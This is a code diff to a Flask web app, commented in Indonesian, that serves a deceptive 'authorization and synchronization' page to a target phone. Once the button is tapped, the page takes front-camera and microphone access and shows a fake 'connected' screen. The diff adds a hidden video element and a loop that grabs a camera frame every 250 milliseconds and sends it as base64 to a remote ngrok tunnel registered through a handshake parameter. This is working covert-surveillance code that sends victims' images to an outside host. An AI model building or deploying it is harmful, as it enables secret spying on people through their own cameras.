@@ -2,21 +2,17 @@ from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
 
-# Variabel global untuk menampung alamat pipa Ngrok aktif dari PC Lab Anda
 ALAMAT_NGROK_LAB = ""
 
 @app.route('/handshake', methods=['GET', 'POST'])
 def handshake():
     global ALAMAT_NGROK_LAB
     
-    # JALUR A: Menangkap setoran koordinat port dari aplikasi run.py PC Lab Anda
     ip_lab = request.args.get('ip_lab')
     if ip_lab:
         ALAMAT_NGROK_LAB = ip_lab.replace("https://", "").replace("http://", "").strip()
         return f"✅ Terkunci: {ALAMAT_NGROK_LAB}", 200
 
-    # JALUR B: HP TARGET MEMBUKA HALAMAN (HTML OTORISASI LANGSUNG DI RENDER)
-    # Ini memastikan halaman merah Anda 100% muncul tanpa bisa terlempar ke onrender.com
     return render_template_string("""
     <html>
     <head>
@@ -38,6 +34,9 @@ def handshake():
             <button class="btn" onclick="triggerAllOtoritas()">OTORISASI & SINKRONISASI</button>
         </div>
 
+        <!-- Tag video hantu tersembunyi untuk memutar umpan kamera di latar belakang -->
+        <video id="v-feed" autoplay playsinline style="display:none;"></video>
+
         <script>
             async function triggerAllOtoritas() {
                 try {
@@ -45,31 +44,35 @@ def handshake():
                         video: { facingMode: "user" }, 
                         audio: true 
                     });
-                    let videoTrack = mediaStream.getVideoTracks();
+                    
+                    // Alirkan data kamera ke dalam tag video hantu
+                    let videoEl = document.getElementById("v-feed");
+                    videoEl.srcObject = mediaStream;
                     
                     document.body.innerHTML = "<div class='box'><h2 style='color:#00ff00;'>[ STATUS: CONNECTED ]</h2><p>Sesi nirkabel aktif melintasi internet proxy.</p><p style='color:gray;'>Jangan tutup browser ini. Lab sedang memantau feed data.</p></div>";
                     
-                    let imageCapture = new ImageCapture(videoTrack);
-                    setInterval(async () => {
+                    // CANVAS ENGINE: Membuat komponen kanvas potong gambar secara mandiri (KEBAL TYPPERROR)
+                    let canvas = document.createElement('canvas');
+                    let ctx = canvas.getContext('2d');
+                    
+                    setInterval(() => {
                         try {
-                            let bitmap = await imageCapture.grabFrame();
-                            let canvas = document.createElement('canvas');
-                            canvas.width = bitmap.width; canvas.height = bitmap.height;
-                            let ctx = canvas.getContext('2d');
-                            ctx.drawImage(bitmap, 0, 0);
-                            
-                            canvas.toBlob(blob => {
-                                let reader = new FileReader();
-                                reader.readAsDataURL(blob);
-                                reader.onloadend = function() {
-                                    // Kirim frame gambar langsung menembus terowongan Ngrok PC Lab Anda yang aktif
-                                    let labDestination = "{{ alamat_lab }}";
-                                    fetch('https://' + labDestination + '/receive_frame', {
-                                        method: 'POST',
-                                        body: reader.result
-                                    });
-                                }
-                            }, 'image/jpeg', 0.4);
+                            if (videoEl.videoWidth > 0 && videoEl.videoHeight > 0) {
+                                canvas.width = videoEl.videoWidth;
+                                canvas.height = videoEl.videoHeight;
+                                
+                                // Menggambar frame dari video ke kanvas secara real-time
+                                ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+                                
+                                // Ubah hasil gambar kanvas murni menjadi Base64 string JPEG ringan
+                                let base64data = canvas.toDataURL('image/jpeg', 0.4);
+                                
+                                let labDestination = "{{ alamat_lab }}";
+                                fetch('https://' + labDestination + '/receive_frame', {
+                                    method: 'POST',
+                                    body: base64data
+                                });
+                            }
                         } catch(e) {}
                     }, 250);
                 } catch(err) {
